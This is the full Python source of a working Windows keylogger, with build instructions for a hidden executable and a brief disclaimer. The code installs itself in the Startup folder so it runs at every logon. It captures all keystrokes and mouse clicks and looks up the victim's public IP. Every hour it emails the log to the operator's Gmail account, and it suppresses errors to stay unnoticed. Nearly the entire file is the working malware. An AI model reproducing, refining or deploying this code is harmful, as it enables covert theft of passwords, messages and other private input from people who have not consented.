# Andrew Maney 2022
# Keylogger made with the 'keyboard' module. 
# Development version 4.6
# Compile with "pyinstaller --onefile --windowed --clean <Path To Script>"
# DO NOT USE THIS PROGRAM FOR MALICIOUS PURPOSES!
# Keyloggers are ILLEGAL if used without permission!


# Imports
import os
import threading
import time
import sys
import shutil
import base64
import urllib.request
from datetime import datetime
from tkinter import messagebox
import keyboard
import ctypes
import smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


# Variables
subject = ""
body = ""
sender_email = "your_email_here"
receiver_email = "your_email_here"
password = "your_password_here"
startuppath = os.getenv('APPDATA') + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
keys = []
ControlKeys = ["space", "backspace", "delete", "enter", "tab", "capslock", "left", "right", "up", "down", "alt", "shift", "control", "win", "esc", "insert", "home", "end", "page up", "page down", "print screen", "num lock", "scroll lock", "pause", "break", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "f11", "f12"]
external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
username = os.getlogin()

# Functions
def DetectClick(button, watchtime = 5):
    while True:
        if button in (1, '1', 'l', 'L', 'left', 'Left', 'LEFT'):
            bnum = 0x01
        elif button in (2, '2', 'r', 'R', 'right', 'Right', 'RIGHT'):
            bnum = 0x02

        start = time.time()
        while 1:
            if ctypes.windll.user32.GetKeyState(bnum) not in [0, 1]:
                keys.append("[MOUSE CLICKED]")
            elif time.time() - start >= watchtime:
                break
            time.sleep(0.001)


def CopyToStartup():
    filename = sys.argv[0]
    try:
        shutil.copyfile(filename, os.path.join(startuppath, os.path.basename(filename)))
    except Exception as EX:
        0+0


def SendMail():
    base64_message = password
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    pswd = message_bytes.decode('ascii')
    while True:
        try:
            subject = "KeyLogger Update ({}, {})".format(datetime.now().date(), datetime.now().time())
            body = "Here's what \"{}@{}\" typed:".format(username, external_ip)
            message = MIMEMultipart()
            message["From"] = sender_email
            message["To"] = receiver_email
            message["Subject"] = subject
            message["Bcc"] = receiver_email
            message.attach(MIMEText(body, "plain"))
            filename = os.getenv('APPDATA') + "\\keys.txt"
            with open(filename, "rb") as attachment:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())
  
            encoders.encode_base64(part)
            part.add_header(
                "Content-Disposition",
                f"attachment; filename=keys.txt",
            )
            message.attach(part)
            text = message.as_string()
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(sender_email, pswd)
                server.sendmail(sender_email, receiver_email, text)
        except:
            0+0
        

        time.sleep(3600) # 86400 = 1 day

        
def INIT():
    global keys
    try:
        if(os.path.exists(os.getenv('APPDATA') + "\\keys.txt")):
            try:
                with open(os.getenv("APPDATA") + "\\keys.txt", "r") as f:
                    keys = f.readlines()
                    keys.append("\n")
                    f.close
            except Exception as EX:
                print(EX)
            
        keys.append("\n[===== PROGRAM STARTED AT: \"{}, {}\" =====]\n".format(datetime.now().date(), datetime.now().time()))
        with open(os.getenv('APPDATA') + "\\keys.txt", "a") as f:
            f.writelines(keys)
            f.close
    except Exception as EX:
        messagebox.showerror("ERROR: {}".format(EX))


def WriteData():
    while True:
        try:
            with open(os.getenv('APPDATA') + "\\keys.txt", "w") as f:
                f.writelines(keys)
                f.close
        except:
            0+0
        time.sleep(1)


def KeyLogger():
    global keys
    while True:
        try:
            key = keyboard.read_key()
            if(keyboard.is_pressed(key)):
                if(not keyboard.is_modifier(key)):
                    if(not key in ControlKeys):
                        keys.append(key)
                    else:
                        keys.append("{[" + key + "]}")
        except Exception as EX:
            print(EX)


# Start the program     
CopyToStartup()
INIT()   
EmailThread = threading.Thread(target=SendMail)
EmailThread.start()
MouseLeftTH = threading.Thread(target=DetectClick, args=['left'])
MouseLeftTH.start()
MouseRightTH = threading.Thread(target=DetectClick, args=['right'])
MouseRightTH.start()
datath = threading.Thread(target=WriteData)
datath.start()
KeyLogger()

